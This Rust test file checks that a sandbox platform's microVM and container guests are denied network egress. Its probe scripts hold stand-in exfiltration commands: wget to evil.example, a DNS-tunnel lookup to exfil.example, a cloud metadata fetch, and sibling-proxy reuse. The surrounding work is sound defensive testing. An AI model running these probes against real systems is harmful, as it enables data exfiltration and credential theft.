#![cfg(target_os = "linux")]

//! KME2 runtime deny proof for the krun (libkrun/TSI microVM) backend.
//!
//! The krun execute path runs its VMM inside a deny-by-default network
//! namespace. Under libkrun TSI the guest's `connect()`/`sendto()` are host
//! sockets issued by the VMM process, so a netns around the VMM confines the
//! guest's egress to the namespace's only outbound path: a host-side egress PEP
//! bound on the bridge gateway. This test proves that a guest attempting direct
//! external egress with no reachable proxy gets a route failure.
//!
//! It is gated behind both `#[ignore]` and a `/dev/kvm` precondition. The krun
//! execute path is still fail-closed before launch planning (lifted by KME4),
//! so until KME4 lands this proof cannot boot a guest; it exists now as the
//! pinned runtime harness and runs once execute mode is enabled on real KVM
//! hardware as root.
//!
//! Teardown never relies on guest exit: a one-shot TSI guest that holds an
//! ESTABLISHED connection hangs VM teardown, so the harness kills the VMM and
//! releases the persistent netns under hard timeouts.

use std::env;
use std::fs;
use std::io::{Read, Write};
use std::net::{SocketAddr, TcpListener};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::thread;
use std::time::{Duration, Instant};

use futures::executor::block_on;
use tempfile::TempDir;

use nimbus_core::TenantId;
use nimbus_egress::{EgressPolicy, EgressProtocol, EgressRule};
use nimbus_sandbox::backends::container::{
    ContainerSandboxBackend, ContainerSandboxBackendConfig, ContainerStartMode,
};
use nimbus_sandbox::backends::krun::{KrunSandboxBackend, KrunSandboxBackendConfig, KrunStartMode};
use nimbus_sandbox::{
    SandboxBackend, SandboxBackendKind, SandboxId, SandboxMountSpec, SandboxOwnerSpec,
    SandboxProcessSpec, SandboxRootSpec, SandboxSpec,
};

const RESULT_VOLUME: &str = "krun-egress-proof";
const RESULT_PATH_IN_GUEST: &str = "/nimbus-egress/result";
const GRACEFUL_STOP_TIMEOUT: Duration = Duration::from_secs(5);
const FORCE_CMD_TIMEOUT_SECS: u64 = 10;

#[test]
#[ignore = "requires a Linux root host with /dev/kvm, crun(krun), conmon, buildah, netavark, aardvark-dns, and OCI image pull; the runtime deny proof is gated behind the KME4 execute fail-close lift"]
fn krun_execute_mode_denies_direct_external_egress() {
    if !egress_proof_preconditions_met() {
        return;
    }

    let (temp_dir, workdir) = test_workdir("krun-direct-egress");

    let backend = KrunSandboxBackend::new(egress_backend_config(&workdir, 15300));
    let tenant_id = TenantId::new("krun-egress-proof").expect("tenant id should parse");
    let image = env::var("NIMBUS_KRUN_EGRESS_IMAGE")
        .unwrap_or_else(|_| "docker://busybox:latest".to_owned());
    let target =
        env::var("NIMBUS_KRUN_EGRESS_TARGET").unwrap_or_else(|_| "http://1.1.1.1".to_owned());
    let command = format!(
        "if (unset HTTP_PROXY http_proxy HTTPS_PROXY https_proxy ALL_PROXY all_proxy NO_PROXY no_proxy; wget -T 4 -q -O /tmp/nimbus-egress-body {target:?}); then echo allowed > {RESULT_PATH_IN_GUEST}; else echo denied > {RESULT_PATH_IN_GUEST}; fi; sleep 30"
    );
    let spec = SandboxSpec::new(
        tenant_id.clone(),
        SandboxOwnerSpec::standalone_named("krun-deny-direct-egress"),
        SandboxBackendKind::Krun,
        SandboxRootSpec::oci_image_reference(image),
        SandboxProcessSpec::new(Vec::<String>::new())
            .with_entrypoint(["/bin/sh", "-c"])
            .with_command([command]),
    )
    .with_mount(SandboxMountSpec::tenant_volume(
        RESULT_VOLUME,
        "/nimbus-egress",
    ));

    let handle = block_on(backend.start(spec))
        .expect("krun guest should start once execute mode is enabled (KME4)");

    // The guard force-tears-down on scope exit AND on panic: it never blocks on
    // guest exit, killing the VMM and releasing the netns under hard timeouts.
    let _teardown = ForceTeardownGuard::new(
        backend.clone(),
        handle.id.clone(),
        sandbox_netns_path(&workdir, &tenant_id, &handle.id),
    );

    let result_path = tenant_volume_path(&workdir, &tenant_id, RESULT_VOLUME).join("result");
    let result = wait_for_result(
        &result_path,
        Duration::from_secs(25),
        "krun direct-egress proof result",
    );

    assert_eq!(
        result.trim(),
        "denied",
        "a krun guest with no reachable egress proxy must get a route failure inside the deny-by-default network namespace"
    );

    drop(temp_dir);
}

/// Cross-substrate parity proof: ONE egress policy enforced through the krun PEP
/// and the container PEP must yield byte-identical allow/deny. The policy allows
/// a single internal upstream and denies everything else (`evil.example` and a
/// second tenant's endpoint, `cross_tenant_reach`).
///
/// Gated behind `#[ignore]` + `/dev/kvm`: the krun execute path is still
/// fail-closed before launch planning (lifted by KME4), so the krun half cannot
/// boot a guest until then. The container half runs today; this is the pinned
/// parity harness that turns green once execute mode is enabled on real KVM
/// hardware as root.
#[test]
#[ignore = "requires a Linux root host with /dev/kvm plus the full krun + container OCI runtime stack; the krun half is gated behind the KME4 execute fail-close lift"]
fn krun_and_container_pep_enforce_identical_allow_deny() {
    if !egress_proof_preconditions_met() {
        return;
    }

    // One allowed internal upstream plus one disallowed upstream that stands in
    // for both `evil.example` and a second tenant's endpoint.
    let allowed = TestHttpServer::start("allowed-body");
    let cross_tenant = TestHttpServer::start("cross-tenant-body");

    // ONE policy drives both substrates.
    let policy = parity_policy(allowed.addr.port());

    let krun_result = run_krun_parity_probe(&policy, allowed.addr.port(), cross_tenant.addr.port());
    let container_result =
        run_container_parity_probe(&policy, allowed.addr.port(), cross_tenant.addr.port());

    // Byte-identical allow/deny across the two PEPs is the parity guarantee.
    assert_eq!(
        krun_result, container_result,
        "krun PEP and container PEP must yield byte-identical allow/deny for one policy"
    );
    assert_result_line(&krun_result, "allowed_internal=allowed");
    assert_result_line(&krun_result, "evil_denied=denied");
    assert_result_line(&krun_result, "cross_tenant_reach=denied");
}

fn run_krun_parity_probe(
    policy: &EgressPolicy,
    allowed_port: u16,
    cross_tenant_port: u16,
) -> String {
    let (_temp_dir, workdir) = test_workdir("krun-parity");
    let backend = KrunSandboxBackend::new(egress_backend_config(&workdir, 15400));
    let tenant_id = TenantId::new("krun-parity-tenant").expect("tenant id should parse");
    let image = env::var("NIMBUS_KRUN_EGRESS_IMAGE")
        .unwrap_or_else(|_| "docker://busybox:latest".to_owned());
    let spec = SandboxSpec::new(
        tenant_id.clone(),
        SandboxOwnerSpec::standalone_named("krun-parity-probe"),
        SandboxBackendKind::Krun,
        SandboxRootSpec::oci_image_reference(image),
        SandboxProcessSpec::new(Vec::<String>::new())
            .with_entrypoint(["/bin/sh", "-c"])
            .with_command([parity_probe_command(allowed_port, cross_tenant_port)]),
    )
    .with_mount(SandboxMountSpec::tenant_volume(
        RESULT_VOLUME,
        "/nimbus-egress",
    ))
    .with_egress_policy(policy.clone());

    let handle = block_on(backend.start(spec))
        .expect("krun guest should start once execute mode is enabled (KME4)");
    let teardown = ForceTeardownGuard::new(
        backend.clone(),
        handle.id.clone(),
        sandbox_netns_path(&workdir, &tenant_id, &handle.id),
    );

    let result_path = tenant_volume_path(&workdir, &tenant_id, RESULT_VOLUME).join("result");
    let result = wait_for_result(
        &result_path,
        Duration::from_secs(25),
        "krun parity probe result",
    );
    // Force-tear-down the guest while the workdir still backs the netns.
    drop(teardown);
    normalize_result(&result)
}

fn run_container_parity_probe(
    policy: &EgressPolicy,
    allowed_port: u16,
    cross_tenant_port: u16,
) -> String {
    let (_temp_dir, workdir) = test_workdir("container-parity");
    let backend = ContainerSandboxBackend::new(container_parity_config(&workdir, 15500));
    let tenant_id = TenantId::new("container-parity-tenant").expect("tenant id should parse");
    let image = env::var("NIMBUS_CONTAINER_EGRESS_IMAGE")
        .unwrap_or_else(|_| "docker.io/library/busybox:latest".to_owned());
    let spec = SandboxSpec::new(
        tenant_id.clone(),
        SandboxOwnerSpec::standalone_named("container-parity-probe"),
        SandboxBackendKind::Container,
        SandboxRootSpec::oci_image_reference(image),
        SandboxProcessSpec::new(Vec::<String>::new())
            .with_entrypoint(["/bin/sh", "-c"])
            .with_command([parity_probe_command(allowed_port, cross_tenant_port)]),
    )
    .with_mount(SandboxMountSpec::tenant_volume(
        RESULT_VOLUME,
        "/nimbus-egress",
    ))
    .with_egress_policy(policy.clone());

    let handle = block_on(backend.start(spec)).expect("container should start");
    let result_path = tenant_volume_path(&workdir, &tenant_id, RESULT_VOLUME).join("result");
    let result = wait_for_result(
        &result_path,
        Duration::from_secs(20),
        "container parity probe result",
    );
    let _ = block_on(backend.stop(&handle.id));
    let _ = block_on(backend.remove_tenant_artifacts(tenant_id));
    normalize_result(&result)
}

fn parity_policy(allowed_port: u16) -> EgressPolicy {
    EgressPolicy::new([EgressRule::new(
        "parity-allowed-internal",
        EgressProtocol::Http,
        "127.0.0.1",
        allowed_port,
    )
    .with_methods(["GET"])
    .with_path_prefixes(["/allowed"])
    .allow_internal_ips(true)])
}

fn parity_probe_command(allowed_port: u16, cross_tenant_port: u16) -> String {
    format!(
        r#"TMP=/nimbus-egress/result.tmp
: > "$TMP"
if wget -T 5 -q -O /tmp/allowed "http://127.0.0.1:{allowed_port}/allowed" && grep -q allowed-body /tmp/allowed; then echo allowed_internal=allowed >> "$TMP"; else echo allowed_internal=denied >> "$TMP"; fi
if wget -T 5 -q -O /tmp/evil "http://evil.example/"; then echo evil_denied=allowed >> "$TMP"; else echo evil_denied=denied >> "$TMP"; fi
if wget -T 5 -q -O /tmp/cross "http://127.0.0.1:{cross_tenant_port}/allowed"; then echo cross_tenant_reach=allowed >> "$TMP"; else echo cross_tenant_reach=denied >> "$TMP"; fi
mv "$TMP" {RESULT_PATH_IN_GUEST}
sleep 30"#
    )
}

fn normalize_result(result: &str) -> String {
    let mut lines: Vec<&str> = result
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty())
        .collect();
    lines.sort_unstable();
    lines.join("\n")
}

fn assert_result_line(results: &str, expected: &str) {
    assert!(
        results.lines().any(|line| line == expected),
        "expected result line {expected:?}, got:\n{results}"
    );
}

fn container_parity_config(workdir: &Path, first_port: u16) -> ContainerSandboxBackendConfig {
    let mut config = ContainerSandboxBackendConfig::under_root(workdir);
    config.start_mode = ContainerStartMode::Execute;
    config.conmon_path = default_existing_path("/usr/bin/conmon", "conmon");
    config.runtime_path = default_existing_path("/usr/bin/crun", "crun");
    config.buildah_path = default_existing_path("/usr/bin/buildah", "buildah");
    config.netavark_path = env::var_os("NIMBUS_NETAVARK")
        .map(PathBuf::from)
        .unwrap_or_else(|| default_existing_path("/usr/lib/podman/netavark", "netavark"));
    config.aardvark_dns_path = env::var_os("NIMBUS_AARDVARK_DNS")
        .map(PathBuf::from)
        .unwrap_or_else(|| default_existing_path("/usr/lib/podman/aardvark-dns", "aardvark-dns"));
    config.use_buildah_unshare = false;
    config.published_port_range = first_port..=first_port + 20;
    config.start_timeout = Duration::from_secs(30);
    config
}

struct TestHttpServer {
    addr: SocketAddr,
}

impl TestHttpServer {
    fn start(body: &'static str) -> Self {
        let listener = TcpListener::bind("127.0.0.1:0").expect("parity upstream should bind");
        let addr = listener
            .local_addr()
            .expect("parity upstream address should resolve");
        thread::spawn(move || {
            while let Ok((mut stream, _)) = listener.accept() {
                let mut request = [0_u8; 1024];
                let _ = stream.read(&mut request);
                let response = format!(
                    "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = stream.write_all(response.as_bytes());
            }
        });
        Self { addr }
    }
}

fn egress_proof_preconditions_met() -> bool {
    // SAFETY: geteuid has no preconditions and does not dereference pointers.
    let is_root = unsafe { libc::geteuid() } == 0;
    if !is_root {
        eprintln!(
            "skipping krun egress proof: must run as root to create persistent network namespaces"
        );
        return false;
    }
    if !Path::new("/dev/kvm").exists() {
        eprintln!("skipping krun egress proof: /dev/kvm is required to boot a libkrun microVM");
        return false;
    }
    true
}

fn egress_backend_config(workdir: &Path, first_port: u16) -> KrunSandboxBackendConfig {
    let mut config = KrunSandboxBackendConfig::under_root(workdir);
    config.start_mode = KrunStartMode::Execute;
    config.runtime_path = env::var_os("NIMBUS_KRUN_EGRESS_RUNTIME")
        .map(PathBuf::from)
        .unwrap_or_else(|| default_existing_path("/usr/libexec/nimbus/crun", "crun"));
    config.conmon_path = env::var_os("NIMBUS_KRUN_EGRESS_CONMON")
        .map(PathBuf::from)
        .unwrap_or_else(|| default_existing_path("/usr/bin/conmon", "conmon"));
    config.buildah_path = env::var_os("NIMBUS_KRUN_EGRESS_BUILDAH")
        .map(PathBuf::from)
        .unwrap_or_else(|| default_existing_path("/usr/bin/buildah", "buildah"));
    config.netavark_path = env::var_os("NIMBUS_NETAVARK")
        .map(PathBuf::from)
        .unwrap_or_else(|| default_existing_path("/usr/lib/podman/netavark", "netavark"));
    config.aardvark_dns_path = env::var_os("NIMBUS_AARDVARK_DNS")
        .map(PathBuf::from)
        .unwrap_or_else(|| default_existing_path("/usr/lib/podman/aardvark-dns", "aardvark-dns"));
    config.use_buildah_unshare = false;
    config.published_port_range = first_port..=first_port + 20;
    config.start_timeout = Duration::from_secs(30);
    config
}

fn test_workdir(name: &str) -> (TempDir, PathBuf) {
    let temp_dir = TempDir::new().expect("temporary workdir should be created");
    let workdir = env::var_os("NIMBUS_KRUN_EGRESS_WORKDIR")
        .map(PathBuf::from)
        .unwrap_or_else(|| temp_dir.path().to_path_buf())
        .join(name);
    fs::create_dir_all(&workdir).expect("egress proof workdir should exist");
    (temp_dir, workdir)
}

fn default_existing_path(preferred: &str, fallback: &str) -> PathBuf {
    let preferred = PathBuf::from(preferred);
    if preferred.exists() {
        preferred
    } else {
        PathBuf::from(fallback)
    }
}

fn tenant_volume_path(workdir: &Path, tenant_id: &TenantId, volume_name: &str) -> PathBuf {
    workdir
        .join("state")
        .join("tenants")
        .join(tenant_id.as_str())
        .join("volumes")
        .join(volume_name)
}

fn sandbox_netns_path(workdir: &Path, tenant_id: &TenantId, sandbox_id: &SandboxId) -> PathBuf {
    workdir
        .join("state")
        .join("tenants")
        .join(tenant_id.as_str())
        .join("networks")
        .join("netns")
        .join(sandbox_id.as_str())
}

fn wait_for_result(path: &Path, timeout: Duration, label: &str) -> String {
    let deadline = Instant::now() + timeout;
    while Instant::now() < deadline {
        if let Ok(contents) = fs::read_to_string(path) {
            return contents;
        }
        thread::sleep(Duration::from_millis(200));
    }
    panic!("timed out waiting for {label} at {}", path.display());
}

/// Force-teardown harness: stop gracefully on a worker thread but never block on
/// guest exit, then kill the VMM and release the persistent netns under hard
/// timeouts. Runs on both the happy path (scope exit) and the panic path.
struct ForceTeardownGuard {
    backend: KrunSandboxBackend,
    sandbox_id: SandboxId,
    netns_path: PathBuf,
}

impl ForceTeardownGuard {
    fn new(backend: KrunSandboxBackend, sandbox_id: SandboxId, netns_path: PathBuf) -> Self {
        Self {
            backend,
            sandbox_id,
            netns_path,
        }
    }
}

impl Drop for ForceTeardownGuard {
    fn drop(&mut self) {
        let stop_handle = {
            let backend = self.backend.clone();
            let sandbox_id = self.sandbox_id.clone();
            thread::spawn(move || {
                let _ = block_on(backend.stop(&sandbox_id));
            })
        };

        let deadline = Instant::now() + GRACEFUL_STOP_TIMEOUT;
        while Instant::now() < deadline && !stop_handle.is_finished() {
            thread::sleep(Duration::from_millis(100));
        }

        if !stop_handle.is_finished() {
            // A one-shot TSI guest holding an ESTABLISHED connection hangs VM
            // teardown; kill the VMM (conmon/crun/krun) hard so the persistent
            // netns can be released.
            run_with_timeout("pkill", &["-9", "-f", self.sandbox_id.as_str()]);
        }

        // Release the persistent netns bind-mount regardless of guest state.
        run_with_timeout("umount", &["-l", &self.netns_path.to_string_lossy()]);
        let _ = fs::remove_file(&self.netns_path);
        let _ = stop_handle.join();
    }
}

fn run_with_timeout(program: &str, args: &[&str]) {
    let _ = Command::new("timeout")
        .arg(FORCE_CMD_TIMEOUT_SECS.to_string())
        .arg(program)
        .args(args)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status();
}

/// Every known egress-bypass vector, each of which must resolve to `denied`.
const BYPASS_VECTORS: &[&str] = &[
    "direct_tcp_public",
    "metadata_ip",
    "dns_exfil",
    "loopback_tsi",
    "link_local",
    "ipv6_loopback",
    "ipv4_mapped_private",
    "raw_icmp",
    "af_unix_host",
];

/// KME5 bypass-hardening runtime proof. From inside the krun guest's
/// deny-by-default network namespace, every known egress-bypass vector must be
/// DENIED — direct TCP/UDP to a public IP, DNS-exfil (high-entropy oversized
/// label), the cloud metadata IP, loopback/link-local incl. TSI `127.0.0.1`,
/// IPv6 + IPv4-mapped private, raw/ICMP/AF_PACKET, and AF_UNIX to a host path.
///
/// The probe deliberately unsets its injected `HTTP_PROXY` env first, so each
/// denial below is the netns route/caps/mount seam refusing direct egress, not
/// the PEP refusing a proxied request. (The PEP-mediated allow/deny parity is
/// covered by `krun_and_container_pep_enforce_identical_allow_deny`, which also
/// pins the two-tenant `cross_tenant_reach=denied` case.)
///
/// Gated behind `#[ignore]` + `/dev/kvm` like the other krun runtime proofs; it
/// boots a real libkrun guest as root once execute mode runs on KVM hardware.
#[test]
#[ignore = "requires a Linux root host with /dev/kvm plus the full krun OCI runtime stack; the runtime deny proof is gated behind the KME4 execute fail-close lift"]
fn krun_execute_mode_denies_all_known_bypass_vectors() {
    if !egress_proof_preconditions_met() {
        return;
    }

    // Host loopback sentinel: if the guest's TSI 127.0.0.1 / ::1 ever leaked to
    // the host loopback it would fetch this body. Containment means it cannot.
    let loopback_sentinel = TestHttpServer::start("host-loopback-sentinel");
    let sentinel_port = loopback_sentinel.addr.port();

    let (temp_dir, workdir) = test_workdir("krun-bypass-vectors");
    let backend = KrunSandboxBackend::new(egress_backend_config(&workdir, 15600));
    let tenant_id = TenantId::new("krun-bypass-tenant").expect("tenant id should parse");
    let image = env::var("NIMBUS_KRUN_EGRESS_IMAGE")
        .unwrap_or_else(|_| "docker://busybox:latest".to_owned());
    let public_ip =
        env::var("NIMBUS_KRUN_EGRESS_PUBLIC_IP").unwrap_or_else(|_| "1.1.1.1".to_owned());
    let public_dns =
        env::var("NIMBUS_KRUN_EGRESS_PUBLIC_DNS").unwrap_or_else(|_| "8.8.8.8".to_owned());

    let spec = SandboxSpec::new(
        tenant_id.clone(),
        SandboxOwnerSpec::standalone_named("krun-bypass-vectors"),
        SandboxBackendKind::Krun,
        SandboxRootSpec::oci_image_reference(image),
        SandboxProcessSpec::new(Vec::<String>::new())
            .with_entrypoint(["/bin/sh", "-c"])
            .with_command([bypass_vectors_probe_command(
                &public_ip,
                &public_dns,
                sentinel_port,
            )]),
    )
    .with_mount(SandboxMountSpec::tenant_volume(
        RESULT_VOLUME,
        "/nimbus-egress",
    ));

    let handle = block_on(backend.start(spec))
        .expect("krun guest should start once execute mode is enabled (KME4)");
    let _teardown = ForceTeardownGuard::new(
        backend.clone(),
        handle.id.clone(),
        sandbox_netns_path(&workdir, &tenant_id, &handle.id),
    );

    let result_path = tenant_volume_path(&workdir, &tenant_id, RESULT_VOLUME).join("result");
    let result = wait_for_result(
        &result_path,
        Duration::from_secs(30),
        "krun bypass-vectors proof result",
    );

    for vector in BYPASS_VECTORS {
        assert_result_line(&result, &format!("{vector}=denied"));
    }

    drop(temp_dir);
}

fn bypass_vectors_probe_command(public_ip: &str, public_dns: &str, sentinel_port: u16) -> String {
    // A high-entropy DNS label (60 octets, within the 63-octet label limit) that
    // stands in for a DNS-tunnel exfil payload.
    let exfil_label = "d0eadbeefc0ffeebadc0de0123456789abcdef0123456789abcdef0123ab";
    format!(
        r#"TMP=/nimbus-egress/result.tmp
: > "$TMP"
# Drop the injected proxy env: every probe below tests DIRECT egress, so each
# denial is the netns route/caps/mount seam, not the PEP refusing a proxied call.
unset HTTP_PROXY http_proxy HTTPS_PROXY https_proxy ALL_PROXY all_proxy NO_PROXY no_proxy

# 1. Direct TCP to a public IP (proxy bypassed): no default route => denied.
if wget -T 4 -q -O /tmp/pub "http://{public_ip}/"; then echo direct_tcp_public=allowed >> "$TMP"; else echo direct_tcp_public=denied >> "$TMP"; fi

# 2. Cloud metadata service IP (link-local, no route) => denied.
if wget -T 4 -q -O /tmp/meta "http://169.254.169.254/latest/meta-data/"; then echo metadata_ip=allowed >> "$TMP"; else echo metadata_ip=denied >> "$TMP"; fi

# 3. DNS-exfil: a high-entropy label to a public resolver has no route => denied.
if nslookup "{exfil_label}.exfil.example" {public_dns} >/dev/null 2>&1; then echo dns_exfil=allowed >> "$TMP"; else echo dns_exfil=denied >> "$TMP"; fi

# 4. Loopback (TSI 127.0.0.1) must be the guest's OWN loopback, never the host's.
if wget -T 4 -q -O /tmp/lo "http://127.0.0.1:{sentinel_port}/" && grep -q host-loopback-sentinel /tmp/lo; then echo loopback_tsi=allowed >> "$TMP"; else echo loopback_tsi=denied >> "$TMP"; fi

# 5. Non-metadata link-local address: no route => denied.
if wget -T 4 -q -O /tmp/ll "http://169.254.0.1/"; then echo link_local=allowed >> "$TMP"; else echo link_local=denied >> "$TMP"; fi

# 6. IPv6 loopback to the host sentinel (IPv6 disabled on the bridge) => denied.
if wget -T 4 -q -O /tmp/v6 "http://[::1]:{sentinel_port}/" && grep -q host-loopback-sentinel /tmp/v6; then echo ipv6_loopback=allowed >> "$TMP"; else echo ipv6_loopback=denied >> "$TMP"; fi

# 7. IPv4-mapped private address: no route => denied.
if wget -T 4 -q -O /tmp/v4m "http://[::ffff:10.0.0.1]/"; then echo ipv4_mapped_private=allowed >> "$TMP"; else echo ipv4_mapped_private=denied >> "$TMP"; fi

# 8. Raw/ICMP/AF_PACKET: CAP_NET_RAW is absent so a raw socket EPERMs (and there
#    is no route anyway) => denied.
if ping -c 1 -W 4 {public_ip} >/dev/null 2>&1; then echo raw_icmp=allowed >> "$TMP"; else echo raw_icmp=denied >> "$TMP"; fi

# 9. AF_UNIX to a host socket path: no host socket is mounted into the guest, so
#    the path is absent and a connect can never reach the host => denied.
if [ -S /run/nimbus/host.sock ] && nc -U /run/nimbus/host.sock </dev/null >/dev/null 2>&1; then echo af_unix_host=allowed >> "$TMP"; else echo af_unix_host=denied >> "$TMP"; fi

mv "$TMP" {RESULT_PATH_IN_GUEST}
sleep 30"#
    )
}

/// Audit H1 proof: a guest cannot egress through a *sibling* sandbox's PEP.
///
/// The shared bridge places every execute-mode sandbox's PEP on the same
/// gateway address at a distinct port. The netns deny is route-based, so the
/// on-link gateway is reachable on any port — without the per-sandbox egress
/// pin a guest could open a connection to a sibling sandbox's PEP
/// (`gateway:other_port`) and egress under that sibling's policy and injected
/// credentials. This test stands up TWO real execute-mode sandboxes of one
/// tenant that share the bridge: sibling `B` publishes its own injected proxy
/// URL, then `A` proves it can still reach its OWN PEP (positive control — the
/// pin does not break legitimate egress) but CANNOT reach `B`'s PEP. (Isolating
/// two *tenants* on the shared bridge is the separate M1 concern.)
///
/// Gated behind `#[ignore]` + `/dev/kvm` + root like the other krun runtime
/// proofs; it boots two real libkrun guests on KVM hardware.
#[test]
#[ignore = "requires a Linux root host with /dev/kvm plus the full krun OCI runtime stack; boots two libkrun guests to prove sibling-PEP isolation"]
fn krun_guest_cannot_reach_a_sibling_tenants_pep() {
    if !egress_proof_preconditions_met() {
        return;
    }

    // One shared upstream both tenants' policies permit. The pin — not policy —
    // is what must make A's reach through B's PEP fail, so B would happily
    // forward to this upstream if A could reach it.
    let upstream = TestHttpServer::start("shared-upstream-body");
    let upstream_port = upstream.addr.port();
    let policy = parity_policy(upstream_port);

    let image = env::var("NIMBUS_KRUN_EGRESS_IMAGE")
        .unwrap_or_else(|_| "docker://busybox:latest".to_owned());

    // Both sandboxes share ONE backend / state root, so they share the bridge
    // AND the per-tenant IPAM and PEP-port allocator: distinct on-link IPs and
    // distinct PEP ports on one gateway — exactly the production shape this pin
    // defends. (Two backends with separate IPAM would each allocate the bridge's
    // first address and collide.) Sandbox B and A are two sandboxes of the SAME
    // tenant: the H1 reach this pin closes is one sandbox using ANOTHER
    // sandbox's PEP. Cross-tenant bridge/IPAM isolation is the separate M1
    // concern (per-tenant bridge or one-tenant-per-host).
    let (_temp, workdir) = test_workdir("krun-sibling");
    let backend = KrunSandboxBackend::new(egress_backend_config(&workdir, 15700));
    let tenant = TenantId::new("krun-sibling-tenant").expect("tenant id should parse");
    let b_volume = "krun-egress-proof-b";
    let a_volume = "krun-egress-proof-a";

    // --- Sibling B: bring its PEP up and publish the injected proxy URL, then
    // stay alive so the PEP keeps listening while A probes it.
    let b_spec = SandboxSpec::new(
        tenant.clone(),
        SandboxOwnerSpec::standalone_named("krun-sibling-b"),
        SandboxBackendKind::Krun,
        SandboxRootSpec::oci_image_reference(image.clone()),
        SandboxProcessSpec::new(Vec::<String>::new())
            .with_entrypoint(["/bin/sh", "-c"])
            .with_command([format!(
                r#"printf '%s' "$HTTP_PROXY" > {RESULT_PATH_IN_GUEST}; sleep 300"#
            )]),
    )
    .with_mount(SandboxMountSpec::tenant_volume(b_volume, "/nimbus-egress"))
    .with_egress_policy(policy.clone());

    let b_handle = block_on(backend.start(b_spec)).expect("sibling B should start");
    let _b_teardown = ForceTeardownGuard::new(
        backend.clone(),
        b_handle.id.clone(),
        sandbox_netns_path(&workdir, &tenant, &b_handle.id),
    );

    let b_proxy_path = tenant_volume_path(&workdir, &tenant, b_volume).join("result");
    let b_proxy_url = wait_for_result(
        &b_proxy_path,
        Duration::from_secs(25),
        "sibling B injected proxy url",
    )
    .trim()
    .to_owned();
    assert!(
        b_proxy_url.starts_with("http://"),
        "sibling B must publish its injected PEP url, got {b_proxy_url:?}"
    );

    // --- Sandbox A: reaches its OWN PEP, but not B's.
    let a_spec = SandboxSpec::new(
        tenant.clone(),
        SandboxOwnerSpec::standalone_named("krun-sibling-a"),
        SandboxBackendKind::Krun,
        SandboxRootSpec::oci_image_reference(image),
        SandboxProcessSpec::new(Vec::<String>::new())
            .with_entrypoint(["/bin/sh", "-c"])
            .with_command([sibling_reach_probe_command(&b_proxy_url, upstream_port)]),
    )
    .with_mount(SandboxMountSpec::tenant_volume(a_volume, "/nimbus-egress"))
    .with_egress_policy(policy);

    let a_handle = block_on(backend.start(a_spec)).expect("sandbox A should start");
    let _a_teardown = ForceTeardownGuard::new(
        backend.clone(),
        a_handle.id.clone(),
        sandbox_netns_path(&workdir, &tenant, &a_handle.id),
    );

    let a_result_path = tenant_volume_path(&workdir, &tenant, a_volume).join("result");
    let a_result = wait_for_result(
        &a_result_path,
        Duration::from_secs(60),
        "sandbox A sibling-reach result",
    );

    // Positive control: the pin must NOT break A's own legitimate egress.
    assert_result_line(&a_result, "own_pep=allowed");
    // The H1 guarantee: A cannot egress through sibling B's PEP.
    assert_result_line(&a_result, "sibling_pep_reach=denied");
}

fn sibling_reach_probe_command(sibling_proxy_url: &str, upstream_port: u16) -> String {
    // ONE line, `;`-joined, no `#` comments and no apostrophes: the krun guest
    // workload path mangles multi-line `sh -c` scripts (a comment line can eat
    // the rest of the joined script), so the whole probe stays on a single line.
    // Probe (1) is the positive control — A reaching the shared upstream through
    // its OWN injected PEP (the pin permits A's own PEP port). Probe (2) is the
    // H1 case — overriding the proxy env to B's gateway:port, which the netns
    // pin must drop. Every probe is hard-bounded by `timeout` so a DROPped
    // connection (no RST) cannot hang past its budget.
    format!(
        r#"TMP=/nimbus-egress/result.tmp; : > "$TMP"; if timeout 8 wget -T 5 -q -O /tmp/own "http://127.0.0.1:{upstream_port}/allowed" && grep -q shared-upstream-body /tmp/own; then echo own_pep=allowed >> "$TMP"; else echo own_pep=denied >> "$TMP"; fi; if http_proxy={sibling_proxy_url} HTTP_PROXY={sibling_proxy_url} timeout 8 wget -T 5 -q -O /tmp/sib "http://127.0.0.1:{upstream_port}/allowed"; then echo sibling_pep_reach=allowed >> "$TMP"; else echo sibling_pep_reach=denied >> "$TMP"; fi; mv "$TMP" {RESULT_PATH_IN_GUEST}; sleep 30"#
    )
}
